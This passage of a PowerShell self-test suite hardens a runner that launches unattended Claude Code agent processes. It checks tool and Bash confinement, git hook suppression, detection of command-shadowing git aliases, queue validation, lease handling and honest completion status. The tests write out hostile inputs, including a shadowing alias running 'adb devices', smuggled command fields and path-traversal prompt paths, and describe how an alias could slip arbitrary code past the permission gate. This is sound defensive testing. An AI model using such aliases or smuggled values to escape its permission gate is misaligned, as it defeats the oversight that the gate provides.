$env:COOKING_LAB_CLAUDE_EXE           = $StubExe
$env:COOKING_LAB_STUB_COUNTER         = $StubCounter
$env:COOKING_LAB_STUB_CONTROL         = $StubControl
$env:COOKING_LAB_STUB_REPO            = $WorkRepo

. $RunnerPath

Check -Name 'runner dot-sources into the scratch environment' `
      -Condition (($RepoRoot -eq $WorkRepo) -and ($GlobalDir -eq $env:COOKING_LAB_GLOBAL_DIR) -and ($ClaudeExe -eq $StubExe)) `
      -Detail "RepoRoot=$RepoRoot GlobalDir=$GlobalDir ClaudeExe=$ClaudeExe"

# The CLI-level permission rules sit beneath the gate. They must confine Bash to
# git and npm, so a gate that failed to install would still leave Bash bounded.
Check -Name 'CLI permission rules confine Bash to git and npm' `
      -Condition (($ChildAllowedTools -match 'Bash\(git:\*\)') -and ($ChildAllowedTools -match 'Bash\(npm:\*\)')) `
      -Detail "allowedTools=$ChildAllowedTools"
Check -Name 'CLI permission rules grant no other Bash surface' `
      -Condition ((@([regex]::Matches($ChildAllowedTools, 'Bash\(')).Count) -eq 2) `
      -Detail "allowedTools=$ChildAllowedTools"
Check -Name 'the child tool set is limited to the seven built-ins' `
      -Condition ($ChildTools -eq 'Bash,Read,Write,Edit,Glob,Grep,TodoWrite') `
      -Detail "tools=$ChildTools"

# The suite runs from inside an interactive Claude Code session, so adopt the
# same documented baseline allowance the runner uses in -SelfTest mode.
$SelfTest = $true
$baseline = Get-ClaudeCliProcesses
$Script:BaselineClaudePids = @()
if ($null -ne $baseline) { $Script:BaselineClaudePids = @($baseline | ForEach-Object { [int]$_.ProcessId }) }
Initialize-LocalDirs

# ---------------------------------------------------------------------
Set-Section '4b. Git hook suppression and alias safety'
# ---------------------------------------------------------------------
# A pre-existing local hook is arbitrary code the queue never authorised.
$hookMarker = Join-Path $WorkRepo 'HOOK_FIRED.txt'
Set-Content -LiteralPath (Join-Path $WorkRepo '.git\hooks\pre-commit') `
            -Value @('#!/bin/sh', 'echo fired > HOOK_FIRED.txt', 'exit 0') -Encoding ascii

Set-Content -LiteralPath (Join-Path $WorkRepo 'hookprobe-a.txt') -Value 'a' -Encoding ascii
Invoke-GitIn $WorkRepo @('add', 'hookprobe-a.txt') | Out-Null
Invoke-GitIn $WorkRepo @('commit', '-m', 'hook probe without suppression') | Out-Null
Check -Name 'a pre-existing Git hook does fire without suppression (control case)' `
      -Condition (Test-Path $hookMarker) -Detail 'the probe hook did not fire, so the next check would prove nothing'
if (Test-Path $hookMarker) { Remove-Item -LiteralPath $hookMarker -Force }

Set-ChildGitEnvironment

Check -Name 'the runner-controlled hooks directory exists and is empty' `
      -Condition ((Test-Path $HooksDir) -and (@(Get-ChildItem -LiteralPath $HooksDir -Force).Count -eq 0)) `
      -Detail "HooksDir=$HooksDir"
Check -Name 'core.hooksPath is redirected for the child' `
      -Condition ((Invoke-GitIn $WorkRepo @('config', '--get', 'core.hooksPath')).Text -eq $HooksDir) `
      -Detail "effective=$((Invoke-GitIn $WorkRepo @('config','--get','core.hooksPath')).Text)"

Set-Content -LiteralPath (Join-Path $WorkRepo 'hookprobe-b.txt') -Value 'b' -Encoding ascii
Invoke-GitIn $WorkRepo @('add', 'hookprobe-b.txt') | Out-Null
Invoke-GitIn $WorkRepo @('commit', '-m', 'hook probe with suppression') | Out-Null
Check -Name 'a pre-existing Git hook does NOT fire for the unattended child' `
      -Condition (-not (Test-Path $hookMarker)) -Detail 'the hook executed despite suppression'

Check -Name 'no Git configuration file was modified to achieve suppression' `
      -Condition ([string]::IsNullOrWhiteSpace((Invoke-GitIn $WorkRepo @('config', '--local', '--get', 'core.hooksPath')).Text)) `
      -Detail 'suppression must come from the process environment, not from written config'
Check -Name 'the system credential helper is still resolvable (GitHub auth intact)' `
      -Condition (-not [string]::IsNullOrWhiteSpace((Invoke-GitIn $RealRepo @('config', '--get', 'credential.helper')).Text)) `
      -Detail 'credential.helper disappeared, which would break pushes'

Remove-Item -LiteralPath (Join-Path $WorkRepo '.git\hooks\pre-commit') -Force
Invoke-GitIn $WorkRepo @('push', 'origin', 'main') | Out-Null

Set-ChildNpmEnvironment
Check -Name 'npm lifecycle scripts are disabled for the child' `
      -Condition ($env:npm_config_ignore_scripts -eq 'true') -Detail "value=$($env:npm_config_ignore_scripts)"
Check -Name 'npm network fetches are disabled for the child' `
      -Condition ($env:npm_config_offline -eq 'true') -Detail "value=$($env:npm_config_offline)"

# An alias turns an allowed subcommand into arbitrary code, and the gate would
# only ever see the allowed word. The runner refuses to launch instead.
Check -Name 'no shadowing git alias is present in the scratch repository' `
      -Condition ($null -eq (Test-NoShadowingGitAlias)) -Detail (Test-NoShadowingGitAlias)
Invoke-GitIn $WorkRepo @('config', '--local', 'alias.status', '!adb devices') | Out-Null
Check -Name 'an alias shadowing an allowed subcommand is detected' `
      -Condition ($null -ne (Test-NoShadowingGitAlias)) -Detail 'the shadowing alias was not detected'
Check -Name 'repository preconditions refuse to launch while the alias exists' `
      -Condition ($null -ne (Test-RepoPreconditions)) -Detail 'preconditions passed despite a shadowing alias'
Invoke-GitIn $WorkRepo @('config', '--local', '--unset', 'alias.status') | Out-Null
Invoke-GitIn $WorkRepo @('config', '--local', 'alias.lg', 'log --oneline') | Out-Null
Check -Name 'a harmless alias that shadows nothing is tolerated' `
      -Condition ($null -eq (Test-NoShadowingGitAlias)) -Detail (Test-NoShadowingGitAlias)
Invoke-GitIn $WorkRepo @('config', '--local', '--unset', 'alias.lg') | Out-Null

# ---------------------------------------------------------------------
Set-Section '5. Queue schema - strict validation'
# ---------------------------------------------------------------------
$good = Publish-Instruction -InstructionId 'schema-baseline-001'
$q = Read-QueueInstruction
Check -Name 'a well-formed instruction validates' -Condition ($q.Status -eq 'READY') -Detail "status=$($q.Status) reason=$($q.Reason)"

function Check-QueueRejected {
    param([string]$Name, [hashtable]$Mutate, [string]$Expect = '')
    $obj = [ordered]@{}
    foreach ($k in $good.Keys) { $obj[$k] = $good[$k] }
    foreach ($k in $Mutate.Keys) {
        if ($null -eq $Mutate[$k]) { $obj.Remove($k) } else { $obj[$k] = $Mutate[$k] }
    }
    Set-QueueRaw (($obj | ConvertTo-Json -Depth 6))
    $r = Read-QueueInstruction
    $rejected = ($r.Status -ne 'READY')
    Check -Name $Name -Condition $rejected -Detail "status=$($r.Status) reason=$($r.Reason)"
}

Check-QueueRejected 'unknown property is rejected'            @{ unexpected_field = 'x' }
Check-QueueRejected 'second unknown property is rejected'     @{ priority = 9 }
Check-QueueRejected 'smuggled command field is rejected'      @{ command = 'adb devices' }
Check-QueueRejected 'smuggled script field is rejected'       @{ script = 'gradlew assembleRelease' }
Check-QueueRejected 'missing required property is rejected'   @{ milestone = $null }
Check-QueueRejected 'wrong type: allow_unattended string'     @{ allow_unattended = 'true' }
Check-QueueRejected 'wrong type: instruction_id number'       @{ instruction_id = 12345 }
Check-QueueRejected 'wrong type: requires_push string'        @{ requires_push = 'yes' }
Check-QueueRejected 'malformed prompt_sha256'                 @{ prompt_sha256 = 'not-a-hash' }
Check-QueueRejected 'uppercase prompt_sha256'                 @{ prompt_sha256 = ([string]$good.prompt_sha256).ToUpper() }
Check-QueueRejected 'short expected_base_commit'              @{ expected_base_commit = 'abc123' }
Check-QueueRejected 'path traversal in prompt_path'           @{ prompt_path = 'build-control/prompts/../../../evil.md' }
Check-QueueRejected 'absolute prompt_path'                    @{ prompt_path = 'C:/Windows/System32/evil.md' }
Check-QueueRejected 'prompt_path outside the prompt directory' @{ prompt_path = 'src/screens/HomeScreen.tsx' }
Check-QueueRejected 'untracked prompt_path'                   @{ prompt_path = 'build-control/prompts/NEVER_COMMITTED.md' }
Check-QueueRejected 'prompt hash mismatch'                    @{ prompt_sha256 = ('0' * 64) }
Check-QueueRejected 'wrong expected_base_commit (bad activation relationship)' @{ expected_base_commit = ('a' * 40) }
Check-QueueRejected 'expected_report_path outside reports/'   @{ expected_report_path = 'src/evil.md' }

Set-QueueRaw (($good | ConvertTo-Json -Depth 6) -replace '"allow_unattended":\s*true', '"allow_unattended": false')
$r = Read-QueueInstruction
Check -Name 'allow_unattended false means nothing is authorised' -Condition ($r.Status -eq 'NONE') -Detail "status=$($r.Status)"

# ---------------------------------------------------------------------
Set-Section '6. Cross-app lease - ownership-safe stale reclaim'
# ---------------------------------------------------------------------
Clear-Lease
$LockFileScratch = Join-Path $GlobalDir 'app.lock.json'

# A live lease belonging to another application is never taken.
$liveLease = [ordered]@{
    app = 'project-a'; owner_token = [guid]::NewGuid().ToString(); generation = 1
    pid = $PID; child_pid = $null; instruction_id = 'mr-001'
    acquired_utc = (Get-UtcNowString); heartbeat_utc = (Get-UtcNowString)
    host = $env:COMPUTERNAME; repo = 'C:\Projects\ProjectA'
}
Initialize-GlobalDir
($liveLease | ConvertTo-Json -Depth 6) | Set-Content $LockFileScratch -Encoding utf8
$res = Request-GlobalLease -InstructionId 'probe'
Check -Name 'a live lease from another application is never taken' -Condition ($res -eq 'HELD') -Detail "result=$res"

# A stale lease (dead owner, old heartbeat) is reclaimable...
$deadPid = 999999
$staleLease = [ordered]@{
    app = 'project-a'; owner_token = [guid]::NewGuid().ToString(); generation = 3
    pid = $deadPid; child_pid = $null; instruction_id = 'mr-002'
    acquired_utc = '2020-01-01T00:00:00Z'; heartbeat_utc = '2020-01-01T00:00:00Z'
    host = $env:COMPUTERNAME; repo = 'C:\Projects\ProjectA'
}
($staleLease | ConvertTo-Json -Depth 6) | Set-Content $LockFileScratch -Encoding utf8
$observed = Get-LeaseIdentity -Lock (Get-GlobalLock)
Check -Name 'a dead owner with an old heartbeat is judged stale' -Condition (Test-LockStale -Lock (Get-GlobalLock)) -Detail 'expected stale'

# ...but ONLY if the lease is still exactly the one that was analysed.
# Simulate another participant legitimately acquiring it in that window.
$freshLease = [ordered]@{
    app = 'project-a'; owner_token = [guid]::NewGuid().ToString(); generation = 4
    pid = $PID; child_pid = $null; instruction_id = 'mr-003'
    acquired_utc = (Get-UtcNowString); heartbeat_utc = (Get-UtcNowString)
    host = $env:COMPUTERNAME; repo = 'C:\Projects\ProjectA'
}
($freshLease | ConvertTo-Json -Depth 6) | Set-Content $LockFileScratch -Encoding utf8
$Script:HeldLock = $false; $Script:LeaseToken = $null
$reclaim = Invoke-LeaseReclaim -ObservedIdentity $observed -InstructionId 'probe'
$still = Get-GlobalLock
Check -Name 'reclaim aborts when the lease changed hands after stale analysis' `
      -Condition ($reclaim -eq 'CHANGED') -Detail "result=$reclaim"
Check -Name 'the newly acquired live lease survives the aborted reclaim' `
      -Condition ([string]$still.owner_token -eq [string]$freshLease.owner_token) `
      -Detail "on disk token=$($still.owner_token) expected=$($freshLease.owner_token)"
Check -Name 'no lease ownership was assumed after an aborted reclaim' `
      -Condition (-not $Script:HeldLock) -Detail "HeldLock=$($Script:HeldLock)"

# The same fingerprint, unchanged, does reclaim - and bumps the generation.
($staleLease | ConvertTo-Json -Depth 6) | Set-Content $LockFileScratch -Encoding utf8
$observed2 = Get-LeaseIdentity -Lock (Get-GlobalLock)
$reclaim2  = Invoke-LeaseReclaim -ObservedIdentity $observed2 -InstructionId 'probe'
$after     = Get-GlobalLock
Check -Name 'an unchanged stale lease is reclaimed' -Condition ($reclaim2 -eq 'RECLAIMED') -Detail "result=$reclaim2"
Check -Name 'reclaim transfers ownership to this runner' -Condition ($after.app -eq 'cooking-lab' -and [int]$after.pid -eq $PID) -Detail "app=$($after.app) pid=$($after.pid)"
Check -Name 'reclaim increments the lease generation' -Condition ([int]$after.generation -eq 4) -Detail "generation=$($after.generation)"
Check -Name 'the lease file is replaced in place, never deleted first' -Condition (Test-Path $LockFileScratch) -Detail 'lease file must exist throughout'

# Heartbeats and release are token-verified, not pid-verified.
$foreign = Get-GlobalLock
$foreign.owner_token = [guid]::NewGuid().ToString()
$hbBefore = [string]$foreign.heartbeat_utc
($foreign | ConvertTo-Json -Depth 6) | Set-Content $LockFileScratch -Encoding utf8
Update-GlobalLockHeartbeat -ChildPid 1234
$hbAfter = [string](Get-GlobalLock).heartbeat_utc
Check -Name 'heartbeat refuses to write over a lease that is no longer ours' `
      -Condition ($hbAfter -eq $hbBefore) -Detail "before=$hbBefore after=$hbAfter"
Remove-GlobalLock
Check -Name 'release refuses to delete a lease that is no longer ours' `
      -Condition (Test-Path $LockFileScratch) -Detail 'foreign lease must survive'
Clear-Lease

# ---------------------------------------------------------------------
Set-Section '7. Completion assessment - a clean exit is not enough'
# ---------------------------------------------------------------------
function New-FakeRun { param([int]$ExitCode = 0, [bool]$TimedOut = $false)
    return [pscustomobject]@{ ExitCode = $ExitCode; TimedOut = $TimedOut; StartedUtc = 'x'; EndedUtc = 'y'; StdoutFile = ''; StderrFile = ''; ChildPid = 0; RunDir = '' } }
function New-FakeOutcome { param([bool]$Human = $false, $IsError = $false)
    return [pscustomobject]@{ IsError = $IsError; Result = 'r'; PermissionDenied = 0; NumTurns = 1; HumanActionRequired = $Human } }
function New-FakeVerification {
    param([bool]$Clean = $true, [bool]$Moved = $true, [bool]$RequiresCommit = $true, [bool]$RequiresPush = $true,
          [string]$Report = $null, [bool]$ReportExists = $true, [bool]$ReportCommitted = $true,
          [bool]$Reachable = $true, [bool]$Pushed = $true, [bool]$Synced = $true)
    return [pscustomobject]@{
        HeadBefore = 'aaa'; HeadAfter = $(if ($Moved) { 'bbb' } else { 'aaa' })
        WorkingTreeStatus = $(if ($Clean) { '' } else { ' M src/x.ts' }); WorkingTreeClean = $Clean
        RequiresCommit = $RequiresCommit; RequiresPush = $RequiresPush
        ExpectedReportPath = $Report; ReportExists = $ReportExists; ReportCommitted = $ReportCommitted
        RemoteReachable = $Reachable; PushedToOrigin = $Pushed; OriginSynchronised = $Synced
    }
}
function Check-State { param([string]$Name, [string]$Expected, $Run, $Outcome, $Verification)
    $a = Get-CompletionAssessment -Run $Run -Outcome $Outcome -Verification $Verification
    Check -Name $Name -Condition ($a.Status -eq $Expected) -Detail "got $($a.Status), expected $Expected :: $($a.Reasons -join ' | ')" }

Check-State 'everything verified -> COMPLETED' 'COMPLETED' (New-FakeRun) (New-FakeOutcome) (New-FakeVerification)
Check-State 'dirty working tree -> RECOVERY_REQUIRED (never COMPLETED)' 'RECOVERY_REQUIRED' `
    (New-FakeRun) (New-FakeOutcome) (New-FakeVerification -Clean $false)
Check-State 'child reported HUMAN ACTION REQUIRED -> HUMAN_ACTION_REQUIRED (never COMPLETED)' 'HUMAN_ACTION_REQUIRED' `
    (New-FakeRun) (New-FakeOutcome -Human $true) (New-FakeVerification)
Check-State 'push did not reach origin -> RECOVERY_REQUIRED (never COMPLETED)' 'RECOVERY_REQUIRED' `
    (New-FakeRun) (New-FakeOutcome) (New-FakeVerification -Pushed $false)
Check-State 'local and origin not synchronised -> RECOVERY_REQUIRED' 'RECOVERY_REQUIRED' `
    (New-FakeRun) (New-FakeOutcome) (New-FakeVerification -Synced $false)
Check-State 'origin unreachable, so the push is unconfirmed -> RECOVERY_REQUIRED' 'RECOVERY_REQUIRED' `
    (New-FakeRun) (New-FakeOutcome) (New-FakeVerification -Reachable $false)
Check-State 'required report missing -> FAILED (never COMPLETED)' 'FAILED' `
    (New-FakeRun) (New-FakeOutcome) (New-FakeVerification -Report 'build-control/reports/R.md' -ReportExists $false)
Check-State 'required report uncommitted -> RECOVERY_REQUIRED' 'RECOVERY_REQUIRED' `
    (New-FakeRun) (New-FakeOutcome) (New-FakeVerification -Report 'build-control/reports/R.md' -ReportCommitted $false)
Check-State 'required commit never happened -> FAILED' 'FAILED' `
    (New-FakeRun) (New-FakeOutcome) (New-FakeVerification -Moved $false)
Check-State 'non-zero exit -> FAILED' 'FAILED' `
    (New-FakeRun -ExitCode 1) (New-FakeOutcome) (New-FakeVerification)
Check-State 'child timed out -> FAILED' 'FAILED' `
    (New-FakeRun -TimedOut $true) (New-FakeOutcome) (New-FakeVerification)
Check-State 'child reported is_error -> FAILED' 'FAILED' `
    (New-FakeRun) (New-FakeOutcome -IsError $true) (New-FakeVerification)
Check-State 'clean exit but every git requirement waived -> COMPLETED' 'COMPLETED' `
    (New-FakeRun) (New-FakeOutcome) (New-FakeVerification -RequiresCommit $false -RequiresPush $false -Moved $false)

$defaults = Get-InstructionRequirements -Instruction ([pscustomobject]@{ instruction_id = 'x' })
Check -Name 'commit and push requirements default to required when the queue is silent' `
      -Condition ($defaults.RequiresCommit -and $defaults.RequiresPush) `
      -Detail "commit=$($defaults.RequiresCommit) push=$($defaults.RequiresPush)"

# ---------------------------------------------------------------------
Set-Section '8. Runner cycle - launch, duplicate suppression and blocking'
# ---------------------------------------------------------------------
Clear-Lease
Reset-RunnerState
Set-StubBehaviour 'ok'
Set-Content -Path $StubCounter -Value '' -Encoding ascii
$null = Publish-Instruction -InstructionId 'cycle-launch-001'

Invoke-RunnerCycle
$countAfterFirst = Get-LaunchCount
$state = Read-InstructionState
Check -Name 'a valid queued prompt launches the worker exactly once' `
      -Condition ($countAfterFirst -eq 1) -Detail "launch count = $countAfterFirst"
Check -Name 'the completed instruction is recorded as COMPLETED' `
      -Condition ($state.ContainsKey('cycle-launch-001') -and [string]$state['cycle-launch-001'].status -eq 'COMPLETED') `
      -Detail "status=$($state['cycle-launch-001'].status)"

Invoke-RunnerCycle
Invoke-RunnerCycle
Check -Name 'the same instruction does not run again on later cycles' `
      -Condition ((Get-LaunchCount) -eq 1) -Detail "launch count = $(Get-LaunchCount)"

Check -Name 'the machine-wide lease was released after the run' `
      -Condition (-not (Test-Path $LockFileScratch)) -Detail 'lease file should be gone'

# --- PAUSE_UNATTENDED --------------------------------------------------
$pauseFileScratch = Join-Path $GlobalDir 'PAUSE_UNATTENDED'
Reset-RunnerState
$null = Publish-Instruction -InstructionId 'cycle-pause-001'
Set-Content -Path $pauseFileScratch -Value 'self-test' -Encoding ascii
$before = Get-LaunchCount
Invoke-RunnerCycle
Check -Name 'PAUSE_UNATTENDED blocks Cooking Lab from launching' `
      -Condition ((Get-LaunchCount) -eq $before) -Detail "launch count moved to $(Get-LaunchCount)"
Remove-Item $pauseFileScratch -Force

# --- simulated Project A ownership ------------------------------------
($liveLease | ConvertTo-Json -Depth 6) | Set-Content $LockFileScratch -Encoding utf8
$before = Get-LaunchCount
Invoke-RunnerCycle
Check -Name 'a live Project A lease blocks Cooking Lab from launching' `
      -Condition ((Get-LaunchCount) -eq $before) -Detail "launch count moved to $(Get-LaunchCount)"
Check -Name "Project A's lease is left untouched" `
      -Condition ([string](Get-GlobalLock).owner_token -eq [string]$liveLease.owner_token) `
      -Detail 'the foreign lease must be byte-identical afterwards'
Clear-Lease

# --- manual Claude Code session ------------------------------------------
$fakeClaudeDir = Join-Path $Scratch 'ClaudeCode'
New-Item -ItemType Directory -Path $fakeClaudeDir -Force | Out-Null
$fakeClaude = Join-Path $fakeClaudeDir 'claude.exe'
Copy-Item (Join-Path $env:SystemRoot 'System32\ping.exe') $fakeClaude -Force
$spawned = Invoke-CimMethod -ClassName Win32_Process -MethodName Create `
              -Arguments @{ CommandLine = "`"$fakeClaude`" -n 40 127.0.0.1"; CurrentDirectory = $Scratch }
$fakePid = [int]$spawned.ProcessId
Start-Sleep -Milliseconds 700
try {
    $detected = Get-ForeignClaudeProcesses
    $sawIt = ($null -ne $detected) -and (@($detected | Where-Object { [int]$_.ProcessId -eq $fakePid }).Count -eq 1)
    Check -Name 'a Claude Code CLI process this runner did not start is detected' `
          -Condition $sawIt -Detail "spawned pid $fakePid, detected: $((@($detected)|ForEach-Object{$_.ProcessId}) -join ',')"
    $before = Get-LaunchCount
    Invoke-RunnerCycle
    Check -Name 'manual Claude Code activity blocks unattended launch' `
          -Condition ((Get-LaunchCount) -eq $before) -Detail "launch count moved to $(Get-LaunchCount)"
} finally {
    Stop-Process -Id $fakePid -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Milliseconds 400

# --- interrupted STARTED instruction -------------------------------------
Reset-RunnerState
$null = Publish-Instruction -InstructionId 'cycle-crash-001'
Set-InstructionRecord -InstructionId 'cycle-crash-001' -Record @{
    instruction_id       = 'cycle-crash-001'
    prompt_path          = 'build-control/prompts/SELFTEST.md'
    prompt_sha256        = [string](Read-QueueInstruction).Instruction.prompt_sha256
    expected_base_commit = [string](Read-QueueInstruction).Instruction.expected_base_commit
    activation_commit    = 'unknown'
    milestone            = 'RUNNER'
    status               = 'STARTED'
    started_utc          = '2026-09-05T00:00:00Z'
    ended_utc            = $null
    exit_code            = $null
    runner_pid           = 4242
    head_before          = 'deadbeef'
    log_dir              = 'scratch'
    notes                = 'simulated interruption'
}
$before = Get-LaunchCount
Invoke-RunnerCycle
$state = Read-InstructionState
Check -Name 'an interrupted STARTED instruction is not blindly re-run' `
      -Condition ((Get-LaunchCount) -eq $before) -Detail "launch count moved to $(Get-LaunchCount)"
Check -Name 'the interrupted instruction is moved to RECOVERY_REQUIRED' `
      -Condition ([string]$state['cycle-crash-001'].status -eq 'RECOVERY_REQUIRED') `
      -Detail "status=$($state['cycle-crash-001'].status)"
Check -Name 'the interrupted run keeps enough state to work out what happened' `
      -Condition (([string]$state['cycle-crash-001'].head_before -eq 'deadbeef') -and ([int]$state['cycle-crash-001'].runner_pid -eq 4242)) `
      -Detail 'head_before and runner_pid must survive'
$before = Get-LaunchCount
Invoke-RunnerCycle
Check -Name 'a RECOVERY_REQUIRED instruction still does not run without a new instruction' `
      -Condition ((Get-LaunchCount) -eq $before) -Detail "launch count moved to $(Get-LaunchCount)"

# --- reused instruction_id for different content --------------------------
Reset-RunnerState
$null = Publish-Instruction -InstructionId 'cycle-reuse-001' -PromptBody "# first`n"
Invoke-RunnerCycle
$before = Get-LaunchCount
$null = Publish-Instruction -InstructionId 'cycle-reuse-001' -PromptBody "# second, different content`n"
Invoke-RunnerCycle
$state = Read-InstructionState
Check -Name 'reusing an instruction_id for different content is refused' `
      -Condition ((Get-LaunchCount) -eq $before) -Detail "launch count moved to $(Get-LaunchCount)"
Check -Name 'the refused reuse is recorded as BLOCKED' `
      -Condition ([string]$state['cycle-reuse-001'].status -eq 'BLOCKED') `
      -Detail "status=$($state['cycle-reuse-001'].status)"

# ---------------------------------------------------------------------
Set-Section '9. End-to-end completion states'
# ---------------------------------------------------------------------
Clear-Lease
Reset-RunnerState
Set-StubBehaviour 'dirty'
$null = Publish-Instruction -InstructionId 'e2e-dirty-001'
Invoke-RunnerCycle
$state = Read-InstructionState
Check -Name 'a run that leaves the tree dirty is NOT marked COMPLETED' `
      -Condition ([string]$state['e2e-dirty-001'].status -eq 'RECOVERY_REQUIRED') `
      -Detail "status=$($state['e2e-dirty-001'].status)"
Remove-Item (Join-Path $WorkRepo 'stray-artifact.txt') -Force -ErrorAction SilentlyContinue

Reset-RunnerState
Set-StubBehaviour 'human'
$null = Publish-Instruction -InstructionId 'e2e-human-001'
Invoke-RunnerCycle
$state = Read-InstructionState
Check -Name 'a run reporting HUMAN ACTION REQUIRED is NOT marked COMPLETED' `
      -Condition ([string]$state['e2e-human-001'].status -eq 'HUMAN_ACTION_REQUIRED') `
      -Detail "status=$($state['e2e-human-001'].status)"

Reset-RunnerState
Set-StubBehaviour 'ok'
$null = Publish-Instruction -InstructionId 'e2e-report-001' -Extra @{ expected_report_path = 'build-control/reports/NEVER_WRITTEN.md' }
Invoke-RunnerCycle
$state = Read-InstructionState
Check -Name 'a missing required report is NOT marked COMPLETED' `
      -Condition ([string]$state['e2e-report-001'].status -eq 'FAILED') `
      -Detail "status=$($state['e2e-report-001'].status)"

Reset-RunnerState
$null = Publish-Instruction -InstructionId 'e2e-push-001' -Extra @{ requires_commit = $true; requires_push = $true }
Invoke-RunnerCycle
$state = Read-InstructionState
Check -Name 'an instruction requiring an unmade commit and push is NOT marked COMPLETED' `
      -Condition ([string]$state['e2e-push-001'].status -ne 'COMPLETED') `
      -Detail "status=$($state['e2e-push-001'].status)"

# ---------------------------------------------------------------------
Set-Section '10. Blast radius'
# ---------------------------------------------------------------------
$productPaths = @('src', 'app', '__tests__', 'package.json', 'package-lock.json', 'app.config.ts',
                  'app.variants.json', 'babel.config.js', 'eslint.config.js', 'jest.config.js',
                  'jest.setup.ts', 'tsconfig.json', 'android', 'README.md')
$diff = Invoke-GitIn $RealRepo (@('diff', '--name-only', "$BaselineCommit..HEAD", '--') + $productPaths)
$wt   = Invoke-GitIn $RealRepo (@('status', '--porcelain', '--') + $productPaths)
Check -Name 'no Cooking Lab runtime or product source changed (committed)' `
      -Condition ([string]::IsNullOrWhiteSpace($diff.Text)) -Detail $diff.Text
Check -Name 'no Cooking Lab runtime or product source changed (working tree)' `
      -Condition ([string]::IsNullOrWhiteSpace($wt.Text)) -Detail $wt.Text

$mrPath = 'C:\Projects\ProjectA'
if (Test-Path $mrPath) {
    $newest = Get-ChildItem -LiteralPath $mrPath -Recurse -Force -ErrorAction SilentlyContinue |
              Sort-Object LastWriteTimeUtc -Descending | Select-Object -First 1
    $untouched = ($null -eq $newest) -or ($newest.LastWriteTimeUtc -lt $SuiteStartUtc)
    Check -Name 'no Project A file was modified during this run' `
          -Condition $untouched `
          -Detail "newest: $($newest.FullName) @ $($newest.LastWriteTimeUtc) (suite started $SuiteStartUtc)"
} else {
    Check -Name 'no Project A file was modified during this run' -Condition $true -Detail 'path not present'
}

$realGlobal = 'C:\Projects\.app-build-control'
$realLease  = Join-Path $realGlobal 'app.lock.json'
Check -Name 'the real machine-wide coordination directory was not written to' `
      -Condition (-not (Test-Path $realLease)) -Detail 'the suite must operate only on its scratch lease'

# ---------------------------------------------------------------------
if ($LiveInvocationCheck) {
    Set-Section '11. Live invocation check (real Claude Code CLI)'

    $liveDir = Join-Path $Scratch 'live'
    New-Item -ItemType Directory -Path (Join-Path $liveDir '.claude') -Force | Out-Null
    $liveMarker = Join-Path $liveDir 'settings-source-hook-ran.txt'
    $gateMarker = Join-Path $liveDir 'controlled-settings-hook-ran.txt'

    $sourceSettings = @{ hooks = @{ PreToolUse = @( @{ matcher = '*'; hooks = @( @{ type = 'command'
        command = "powershell -NoProfile -Command `"Set-Content -Path '$($liveMarker -replace '\\','/')' -Value RAN`"" } ) } ) } }
    ($sourceSettings | ConvertTo-Json -Depth 8) | Set-Content (Join-Path $liveDir '.claude\settings.json') -Encoding utf8

    $controlled = @{ hooks = @{ PreToolUse = @( @{ matcher = '*'; hooks = @( @{ type = 'command'
        command = "powershell -NoProfile -Command `"Set-Content -Path '$($gateMarker -replace '\\','/')' -Value RAN`"" } ) } ) } }
    ($controlled | ConvertTo-Json -Depth 8) | Set-Content (Join-Path $liveDir 'controlled-settings.json') -Encoding utf8

    $livePrompt = Join-Path $liveDir 'prompt.txt'
    Set-Content -Path $livePrompt -Value 'Run exactly this bash command: echo hello. Then reply with only the word DONE.' -Encoding utf8

    $liveArgs = '-p --output-format json --permission-mode acceptEdits ' +
                '--setting-sources "" ' +
                '--strict-mcp-config --mcp-config "{\"mcpServers\":{}}" ' +
                ('--settings "{0}" ' -f (Join-Path $liveDir 'controlled-settings.json')) +
                '--tools "Bash"'
    $lp = Start-Process -FilePath 'claude' -ArgumentList $liveArgs -WorkingDirectory $liveDir `
                        -RedirectStandardInput $livePrompt `
                        -RedirectStandardOutput (Join-Path $liveDir 'out.json') `
                        -RedirectStandardError (Join-Path $liveDir 'err.log') `
                        -NoNewWindow -Wait -PassThru
    $liveErr = (Get-Content (Join-Path $liveDir 'err.log') -Raw -ErrorAction SilentlyContinue)

    Check -Name 'the hardened flag set is accepted by the real CLI' `
          -Condition ($lp.ExitCode -eq 0) -Detail "exit=$($lp.ExitCode) stderr=$liveErr"
    Check -Name 'uncontrolled settings sources are NOT loaded (no source hook ran)' `
          -Condition (-not (Test-Path $liveMarker)) -Detail 'a settings-source hook executed; sources are being inherited'
    Check -Name "the runner's own controlled settings ARE loaded (gate hook ran)" `
          -Condition (Test-Path $gateMarker) -Detail 'the gate would not be installed'
}

# ---------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------
$passed = @($Results | Where-Object { $_.Passed }).Count
$failed = @($Results | Where-Object { -not $_.Passed }).Count

Write-Host ''
Write-Host ('=' * 66)
Write-Host ("RESULT: $passed passed, $failed failed, $($Results.Count) total") -ForegroundColor $(if ($failed -eq 0) { 'Green' } else { 'Red' })
Write-Host ('=' * 66)
if ($failed -gt 0) {
    Write-Host 'Failures:' -ForegroundColor Red
    $Results | Where-Object { -not $_.Passed } | ForEach-Object { Write-Host "  [$($_.Section)] $($_.Name) :: $($_.Detail)" -ForegroundColor Red }
}

$evidenceDir = Join-Path $RealRepo '.build-control-local\selftest'
if (-not (Test-Path $evidenceDir)) { New-Item -ItemType Directory -Path $evidenceDir -Force | Out-Null }
$evidence = Join-Path $evidenceDir 'RUNNER_HARDENING_SELFTEST.md'
$lines = New-Object System.Collections.ArrayList
[void]$lines.Add('# Runner hardening self-test - results')
[void]$lines.Add('')
[void]$lines.Add("Run (UTC): $($SuiteStartUtc.ToString('yyyy-MM-ddTHH:mm:ssZ'))")
[void]$lines.Add("Result: $passed passed, $failed failed, $($Results.Count) total")
[void]$lines.Add("Live invocation check: $(if ($LiveInvocationCheck) { 'yes' } else { 'no' })")
[void]$lines.Add('')
$currentSection = ''
foreach ($r in $Results) {
    if ($r.Section -ne $currentSection) {
        $currentSection = $r.Section
        [void]$lines.Add('')
        [void]$lines.Add("## $currentSection")
        [void]$lines.Add('')
    }
    [void]$lines.Add(("- [{0}] {1}" -f $(if ($r.Passed) { 'PASS' } else { 'FAIL' }), $r.Name))
}
Set-Content -Path $evidence -Value ($lines -join "`r`n") -Encoding utf8
Write-Host "evidence written: $evidence"

if (-not $KeepScratch) {
    Remove-Item -LiteralPath $Scratch -Recurse -Force -ErrorAction SilentlyContinue
} else {
    Write-Host "scratch kept: $Scratch"
}

if ($failed -gt 0) { exit 1 }
exit 0
